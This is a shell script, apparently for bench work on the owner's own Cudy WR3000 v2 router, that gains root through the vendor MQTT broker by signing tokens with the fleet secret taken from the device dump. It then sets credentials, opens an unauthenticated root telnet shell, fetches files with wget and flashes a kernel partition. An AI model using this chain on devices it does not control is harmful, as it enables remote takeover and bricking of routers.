#!/bin/sh
# box-provision.sh - bring a stock Cudy WR3000 v2 to a known state over the LAN, without SSH.
#
# The stock firmware runs the vendor's MQTT broker on 1883 and accepts a JWT signed with the fleet
# secret from the device's own bdinfo. That channel executes commands as root and returns their stdout,
# which is all this needs: the 2.4.15 image ships no /usr/sbin/dropbear, so SSH cannot work until a
# binary exists. Every step below reads its result back before reporting success.
#
# usage:
#   box-provision.sh --bdinfo dumps/router-20261108/bdinfo.bin --admin-pass <pw>
#                    [--ssid <ssid>] [--wifi-pass <pw>] [--host 192.168.10.1]
#                    [--ssh-key <pubkey-file>] [--telnetd] [--cmd <command>]
#                    [--stage base|lab|fire] [--dry-run]
#
# --dry-run prints the box's current wireless config and exits; use it before changing anything.
set -eu

HERE=$(cd "$(dirname "$0")/.." && pwd)
HOST=192.168.10.1
BDINFO=""
ADMIN_PASS=""
SSID=""
WIFI_PASS=""
SSH_KEY=""
START_TELNETD=0
STAGE=base
DRY_RUN=0
CMD=""

while [ $# -gt 0 ]; do
    case "$1" in
        --bdinfo) BDINFO=$2; shift 2 ;;
        --admin-pass) ADMIN_PASS=$2; shift 2 ;;
        --ssid) SSID=$2; shift 2 ;;
        --wifi-pass) WIFI_PASS=$2; shift 2 ;;
        --host) HOST=$2; shift 2 ;;
        --ssh-key) SSH_KEY=$2; shift 2 ;;
        --telnetd) START_TELNETD=1; shift ;;
        --stage) STAGE=$2; shift 2 ;;
        --cmd) CMD=$2; shift 2 ;;
        --dry-run) DRY_RUN=1; shift ;;
        *) echo "unknown argument: $1" >&2; exit 2 ;;
    esac
done

if [ -z "$BDINFO" ] || [ ! -f "$BDINFO" ]; then
    echo "error: --bdinfo <dump> is required (the device's own bdinfo.bin)" >&2
    exit 2
fi

PY=""
for cand in "$HERE/.provision-venv/bin/python" "$HERE/pyenv/bin/python3" python3; do
    if [ -x "$cand" ] || command -v "$cand" >/dev/null 2>&1; then
        if "$cand" -c 'import Crypto, jwt, paho.mqtt' >/dev/null 2>&1; then
            PY=$cand
            break
        fi
    fi
done
if [ -z "$PY" ]; then
    echo "creating $HERE/.provision-venv (needs network for pip)" >&2
    python3 -m venv "$HERE/.provision-venv"
    "$HERE/.provision-venv/bin/pip" install -q pycryptodome PyJWT paho-mqtt
    PY="$HERE/.provision-venv/bin/python"
fi

SECRET=$("$PY" "$HERE/tools/decrypt_bdinfo.py" "$BDINFO" | sed -n 's/^ *secret *= *//p' | awk '{print $1}' | head -1)
DEVICEID=$("$PY" "$HERE/tools/decrypt_bdinfo.py" "$BDINFO" | sed -n 's/^ *deviceid *= *//p' | awk '{print $1}' | head -1)
if [ -z "$SECRET" ]; then
    echo "error: could not recover the fleet secret from $BDINFO" >&2
    exit 1
fi

    root_cmd() {
    # The broker payload is a JSON envelope with the command inside it; build it here so any
    # command survives as one string (no intermediate shell to split it) and pass it with --raw.
    PAYLOAD=$("$PY" -c 'import json,sys; sys.stdout.buffer.write(json.dumps({"cmd": sys.argv[1], "reply": 1}).encode())' "$1") || {
        echo "error: could not build the broker payload" >&2
        return 1
    }
    # the C side needs the JSON envelope followed by one NUL byte, and sh cannot carry a NUL
    # through a variable, so mqtt_takeover.py adds it for the --raw payload
    timeout "$(( ${2:-12} + 15 ))" "$PY" "$HERE/tools/mqtt_takeover.py" --host "$HOST" --port 1883 \
        --deviceid "$DEVICEID" --role satellite --secret "$SECRET" \
        --raw --cmd "$PAYLOAD" --listen "${2:-12}" 2>&1 |
        strings |
        sed -n 's/.*"data":"\(.*\)$/\1/p' | tail -1
}

if [ "$DRY_RUN" -eq 1 ]; then
    root_cmd "true" 30
    exit 0
fi

if [ -n "$CMD" ]; then
    root_cmd "$CMD" 60
    exit 0
fi

if [ "$STAGE" = base ]; then
if [ -n "$SSID" ] || [ -n "$WIFI_PASS" ]; then
    if [ -z "$SSID" ] || [ -z "$WIFI_PASS" ]; then
        echo "error: --ssid and --wifi-pass must be given together" >&2
        exit 2
    fi
    echo "[*] setting Wi-Fi ssid=$SSID"
    root_cmd "uci set wireless.@wifi-iface[0].ssid='$SSID'; uci set wireless.@wifi-iface[0].key='$WIFI_PASS'; uci set wireless.@wifi-iface[0].encryption='psk2'; uci set wireless.@wifi-iface[1].ssid='$SSID'; uci set wireless.@wifi-iface[1].key='$WIFI_PASS'; uci set wireless.@wifi-iface[1].encryption='psk2'; uci commit wireless; wifi reload; sleep 3; uci get wireless.@wifi-iface[0].ssid" 25
fi

if [ -n "$ADMIN_PASS" ]; then
    echo "[*] setting the admin (root) password"
    root_cmd "printf 'root:%s\\n' '$ADMIN_PASS' | chpasswd; grep -c '^root:.' /etc/shadow" 15
fi

if [ -n "$SSH_KEY" ]; then
    if [ ! -f "$SSH_KEY" ]; then
        echo "error: ssh key not found: $SSH_KEY" >&2
        exit 2
    fi
    PUB=$(cat "$SSH_KEY")
    echo "[*] installing the SSH key and trying to start dropbear"
    root_cmd "mkdir -p /etc/dropbear; echo '$PUB' > /etc/dropbear/authorized_keys; chmod 600 /etc/dropbear/authorized_keys; opkg update >/dev/null 2>&1; opkg install dropbear 2>&1 | tail -1; /etc/init.d/dropbear enable >/dev/null 2>&1; /etc/init.d/dropbear start >/dev/null 2>&1; sleep 2; netstat -tln 2>/dev/null | grep -c ':22 '" 40
fi

if [ "$START_TELNETD" -eq 1 ]; then
    echo "[*] starting the root telnet listener on 23"
    root_cmd '/usr/sbin/telnetd -l /bin/sh; sleep 1; netstat -tln 2>/dev/null | grep -c ":23 "' 15
fi
fi

MODS_DIR=${MODS_DIR:-/tmp/vmods}
PATCHED=${PATCHED:-/tmp/vmods-patched}
OBJCOPY=${OBJCOPY:-$HERE/build/linux-kbuild/toolchain/bin/arm-none-linux-gnueabihf-objcopy}
if [ -z "${SLICE:-}" ]; then
    SLICE=$(ls -t "$HERE"/build/linux-kbuild/luofu-slice-phase*.bin 2>/dev/null | head -1 || true)
fi
HTTP_PORT=${HTTP_PORT:-8000}
# The host address on the bench LAN must be derived, not remembered: the old hardcoded
# 192.168.10.88 does not exist on this host (the adapter carries 192.168.10.44), so the
# server could not bind and a fire would fail before the erase.
if [ -z "${HTTP_IP:-}" ]; then
    HTTP_IP=$(ip -4 -o addr show 2>/dev/null | awk '$4 ~ /^192\.168\.10\./ {sub(/\/.*/, "", $4); print $4; exit}')
fi
if [ -z "${HTTP_IP:-}" ]; then
    echo "error: cannot find this host's 192.168.10.x address; set HTTP_IP=..." >&2
    exit 2
fi
if ! ip -4 -o addr show 2>/dev/null | grep -q " $HTTP_IP/"; then
    echo "error: HTTP_IP=$HTTP_IP is not a local address (bench host is usually 192.168.10.44)" >&2
    exit 2
fi
SRV=""
SERVE_DIR="$HERE/build/linux-kbuild/http-root"

serve_and_push() {
    echo "[*] serving http://$HTTP_IP:$HTTP_PORT (the box must reach this port)"
    pkill -f "http.server $HTTP_PORT" 2>/dev/null || true
    sleep 0.5
    : > "$HERE/build/linux-kbuild/http-fire.log"
    ( cd "$1" && python3 -m http.server "$HTTP_PORT" --bind "$HTTP_IP" >> "$HERE/build/linux-kbuild/http-fire.log" 2>&1 ) &
    SRV=$!
    sleep 1
    if ! kill -0 "$SRV" 2>/dev/null; then
        echo "error: HTTP server failed to bind http://$HTTP_IP:$HTTP_PORT" >&2
        tail -5 "$HERE/build/linux-kbuild/http-fire.log" >&2 2>/dev/null || true
        return 1
    fi
}

stop_serve() {
    [ -n "$SRV" ] && kill "$SRV" 2>/dev/null || true
    [ -n "$SRV" ] && wait "$SRV" 2>/dev/null || true
    SRV=""
}

case "$STAGE" in
base)
    if [ -n "$CMD" ]; then :; elif [ -z "$SSID$WIFI_PASS$ADMIN_PASS$SSH_KEY" ] && [ "$START_TELNETD" -eq 0 ]; then
        echo "[*] --stage base with no provisioning flags does nothing."
        echo "    It does not restore a slot or env; use a reboot/rollback plan instead (RUNBOOK.md)."
    fi
    ;;
lab)
    if [ ! -d "$PATCHED" ] || [ -z "$(ls "$PATCHED"/*.ko 2>/dev/null)" ]; then
        if [ ! -d "$MODS_DIR" ] || [ -z "$(ls "$MODS_DIR"/*.ko 2>/dev/null)" ]; then
            echo "error: no vendor modules to patch." >&2
            echo "       Set PATCHED=<already-patched dir>, or pull the stock set from the box first:" >&2
            echo "       tools/rscp.sh root@192.168.10.1:/lib/hisilicon/ko/. /tmp/vmods/   (read-only pull)" >&2
            exit 1
        fi
        echo "[*] patching $MODS_DIR -> $PATCHED"
        mkdir -p "$PATCHED"
        cp "$MODS_DIR"/*.ko "$PATCHED"/
        : > /tmp/empty.bin
        for f in "$PATCHED"/*.ko; do
            "$OBJCOPY" --add-section .plt=/tmp/empty.bin --add-section .init.plt=/tmp/empty.bin "$f" || exit 1
        done
    fi
    echo "[*] packing and serving $(ls "$PATCHED"/*.ko | wc -l) modules"
    mkdir -p "$HERE/build/linux-kbuild"
    ( cd "$PATCHED" && tar -czf "$HERE/build/linux-kbuild/tmp-vmods.tgz" ./*.ko )
    mkdir -p "$SERVE_DIR"
    cp "$HERE/build/linux-kbuild/tmp-vmods.tgz" "$SERVE_DIR/"
    serve_and_push "$SERVE_DIR" || { stop_serve; exit 1; }
    if ! root_cmd "set -e; mkdir -p /overlay/upper/lib/hisilicon/ko; cd /tmp; wget -q -O vmods.tgz http://$HTTP_IP:$HTTP_PORT/tmp-vmods.tgz; tar -xzf vmods.tgz -C /overlay/upper/lib/hisilicon/ko; ls /overlay/upper/lib/hisilicon/ko/*.ko | wc -l" 60; then
        stop_serve
        echo "error: the module push failed" >&2
        exit 1
    fi
    stop_serve
    ;;
fire)
    "$HERE/tools/check-init-shadow.sh" || exit 1
    if [ -z "$SLICE" ] || [ ! -f "$SLICE" ]; then
        echo "error: slice not found: ${SLICE:-<none>}; set SLICE=<path>" >&2
        exit 2
    fi
    TRAILER="$HERE/build/linux-kbuild/slice-trailer-40732.bin"
    if [ -f "$TRAILER" ]; then
        if ! tail -c 40732 "$SLICE" | cmp -s - "$TRAILER"; then
            echo "error: slice trailer mismatch: $SLICE" >&2
            exit 2
        fi
    else
        echo "error: $TRAILER not found; cannot validate the slice tail (refusing to write)" >&2
        exit 2
    fi
    SLICE_SIZE=$(stat -c %s "$SLICE")
    SLICE_MD5=$(md5sum "$SLICE" | awk '{print $1}')
    echo "[*] slice: $SLICE ($SLICE_SIZE bytes, md5 $SLICE_MD5)"
    mkdir -p "$HERE/build/linux-kbuild"
    cp "$SLICE" "$HERE/build/linux-kbuild/tmp-payload-slice.bin"
    mkdir -p "$SERVE_DIR"
    cp "$SLICE" "$SERVE_DIR/tmp-payload-slice.bin"
    serve_and_push "$SERVE_DIR" || { stop_serve; exit 1; }
    echo "[*] writing the image to kernelb via the broker channel"
    # One line: a backslash continuation does not survive the device's JSON decode (attempt 2
    # died on it). boot_reg is what hands control to the slice: with bootflag=b alone the
    # vendor userspace boots stock from kernelb, which is what the 15:29 3df fire did.
    FIRE_CMD="set -e; cd /tmp; rm -f slice.bin; wget -q -O slice.bin http://$HTTP_IP:$HTTP_PORT/tmp-payload-slice.bin 2>/tmp/wget.log || { echo WGET_FAIL; tail -3 /tmp/wget.log; exit 1; }; test \"\$(wc -c < slice.bin)\" = \"$SLICE_SIZE\" || { echo SIZE_FAIL; exit 1; }; test \"\$(md5sum slice.bin | cut -d' ' -f1)\" = \"$SLICE_MD5\" || { echo MD5_FAIL; exit 1; }; mtd erase kernelb || { echo ERASE_FAIL; exit 1; }; mtd write slice.bin kernelb || { echo WRITE_FAIL; exit 1; }; mtd verify slice.bin kernelb || { echo VERIFY_FAIL; exit 1; }; ln -sf /bin/fw_printenv /tmp/fw_setenv; /tmp/fw_setenv bootflag b || { echo SETENV_FAIL; exit 1; }; echo 0x21 > /sys/devices/platform/sysenv/boot_reg || { echo BOOTREG_FAIL; exit 1; }; devmem 0x10100C94 32 0xDEAD0000; fw_printenv bootflag; cat /sys/devices/platform/sysenv/boot_reg; sync; echo FIRE_OK"
    OUT=$(root_cmd "$FIRE_CMD" 240) || {
        stop_serve
        echo "error: the broker fire command failed" >&2
        exit 1
    }
    stop_serve
    case "$OUT" in
        *FIRE_OK*)
            echo "[*] image written and verified; rebooting the box"
            ;;
        *)
            echo "error: the broker fire did not report FIRE_OK; out: $OUT" >&2
            exit 1
            ;;
    esac
    root_cmd "sync; reboot" 10 || true
    ;;
*)
    echo "error: --stage must be base, lab or fire" >&2
    exit 2
    ;;
esac

echo "[*] done"
